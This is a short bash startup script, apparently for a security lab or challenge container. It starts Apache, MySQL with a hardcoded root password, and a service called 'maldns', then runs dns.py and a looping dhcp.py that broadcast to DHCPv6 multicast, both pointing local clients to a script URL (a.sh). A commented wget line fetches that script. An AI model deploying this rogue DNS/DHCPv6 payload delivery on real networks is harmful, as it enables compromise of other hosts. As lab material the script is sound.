#!/usr/bin/env bash

service apache2 start
service apache2 start

service mysql start
service mysql start

mysql -u root -p"root" < /db.sql

service maldns start
service maldns start

# loop until we have IP
while true;
do
  IPin=$(ip address show eth0 | grep 'inet ' | awk '{print $2}' | cut -f1 -d'/' | cut -f1 -d.)
  if [ -z "$IPin" ]
  then
        sleep 2
  else
        if [ $IPin -eq 10 ]; then break ; fi
        sleep 2
  fi
done

export IP=`ifconfig eth0 | grep 'inet ' | cut -d: -f2 | awk '{ print $2}'`

./dns.py $IP 53 http://$IP:80/a.sh &

while true;
do
  #ping -c 1 10.0.0.2 &> /dev/null
  #if [[ $?  -eq 0 ]]; then
  ./dhcp.py ff02::1 547 http://$IP:80/a.sh
  #fi
  SEC=$((4 + RANDOM % 5))
  sleep $SEC;
done

# wget http://10.0.0.1:80/a.sh